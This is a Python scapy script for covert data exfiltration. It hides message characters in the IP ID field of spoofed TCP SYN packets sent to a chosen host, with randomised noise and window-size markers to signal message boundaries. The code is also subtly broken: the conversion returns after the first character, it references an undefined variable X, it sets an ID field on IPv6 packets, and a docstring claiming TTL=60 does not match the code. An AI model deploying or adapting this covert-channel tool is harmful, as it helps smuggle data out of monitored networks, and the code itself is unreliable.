from scapy.all import *

def add_n0ise_ipid(packet_sequence, pkt):
    print('[*] adding n0ise to IPID..')
    # Add some randomness
    randy = random.randint(-999, 999)  # too large will produce error
    pkt.seq = packet_sequence + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print("\nERROR: Problem sending packets, are you root?\n")
        exit(0)



def convert_ipid(message):
    retval = []
    print('[*] converting ipid message: %s' % message)
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * 256
        # Add to the global exfilArray.
        if is_16bit(exfilChar):
            # do nothing (refactor to if not?)
            print('[+] IPID size OK')
        else:
            print('[-] Warning: IPID int too large %d. Setting to X' % exfilChar)
            exfilChar = ord(X) * 256
        retval.append(exfilChar)
        print('%s=%d, exfilChar=%d' % (char, c, exfilChar))
        return retval


def exfil_ipid(spoof, destination, dstport, message):
    exfilArray = convert_ipid(message)
    msglen = len(exfilArray)
    print('[*] Attempting ID identification exfil..msglen', msglen)
    # reset our packet
    pkt = IPv6(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
    i = 0
    for c in exfilArray:
        print('[*] count i:', i)
        if i == msglen:
            print('[*] EOM')
        add_n0ise_ipid(exfilArray[i], pkt)
        pkt.id = exfilArray[i]
        pkt.window = 1338
        time.sleep(0.4)
        try:
            send(pkt)
        except socket.error:
            print("\nERROR: Problem sending packets, are you root?\n")
            exit(0)
        i += 1
    send_eom(pkt)

def is_16bit(input_to_check):
    """ Validate that we have a 16-bit value so it will fit into the IPID
    header

    Args:
        input_to_check (int): Integer value to check

    Returns:
        True if the value is 16-bit, False otherwise
    """
    bitl = (input_to_check).bit_length()
    if bitl <= 16:
        # print '[*] OK: int is 16bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


def send_eom(pkt):
    """Send the last message, encoded with a special TTL to let
    the server know we're done.

    Set the ttl=60 to indicate end-of-message

    Args:
        pkt (Packet): Scapy packet
    """
    print('[*] Sending End-Of-Message')
    pkt.window = 7331 # It's a magical number!
    send(pkt)
